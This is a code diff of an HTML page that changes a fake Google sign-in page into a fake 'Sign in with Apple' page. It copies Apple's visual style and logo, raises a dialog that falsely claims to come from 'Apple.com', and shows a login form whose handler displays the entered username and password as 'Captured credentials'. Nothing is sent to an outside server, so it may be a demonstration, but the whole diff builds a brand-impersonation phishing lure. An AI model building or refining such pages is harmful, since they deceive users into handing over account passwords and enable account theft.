@@ -2,49 +2,83 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Google Login</title>
+  <title>Sign in with Apple</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');
+
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+      font-family: 'SF Pro Display', Arial, sans-serif;
+      background-color: #f5f5f7;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
+
     .login-container {
       background: #fff;
       padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      width: 300px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      width: 320px;
       text-align: center;
     }
+
     h2 {
+      font-weight: 600;
       margin-bottom: 20px;
       font-size: 24px;
-      color: #202124;
+      color: #1c1c1e;
     }
+
     input {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       margin-bottom: 16px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 14px;
+      border: 1px solid #d1d1d6;
+      border-radius: 8px;
+      font-size: 16px;
+      outline: none;
+      transition: border 0.2s ease-in-out;
     }
+
+    input:focus {
+      border-color: #007aff;
+    }
+
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
+      padding: 14px;
+      background-color: #000;
       color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 8px;
       font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.2s ease-in-out, transform 0.1s ease;
     }
+
     button:hover {
-      background-color: #155ab6;
+      background-color: #1c1c1e;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .logo {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
     }
   </style>
 </head>
@@ -52,24 +86,32 @@
 
   <div class="login-container">
     <h2>Sign in</h2>
-    <input type="text" id="username" placeholder="Email or phone" />
-    <input type="password" id="password" placeholder="Enter your password" />
-    <button onclick="handleLogin()">Login</button>
+    <button id="appleBtn" onclick="showPrompt()">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
+      Sign in with Apple
+    </button>
+
+    <div id="credentialForm" class="hidden">
+      <input type="text" id="username" placeholder="Email or phone" />
+      <input type="password" id="password" placeholder="Enter your password" />
+      <button onclick="handleLogin()">Login</button>
+    </div>
   </div>
 
   <script>
+    function showPrompt() {
+      const proceed = confirm("Apple.com says:\nPlease enter your credentials here.");
+      if (proceed) {
+        document.getElementById('credentialForm').classList.remove('hidden');
+      } else {
+        alert("Sign-in cancelled.");
+      }
+    }
+
     function handleLogin() {
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
-
-      // Prompt user with fake security alert
-      const userConfirmed = confirm("Google.com says:\nPlease enter your credentials here.");
-      
-      if (userConfirmed) {
-        alert("Captured credentials:\nUsername: " + username + "\nPassword: " + password);
-      } else {
-        alert("Login cancelled.");
-      }
+      alert("Captured credentials:\nUsername: " + username + "\nPassword: " + password);
     }
   </script>
 
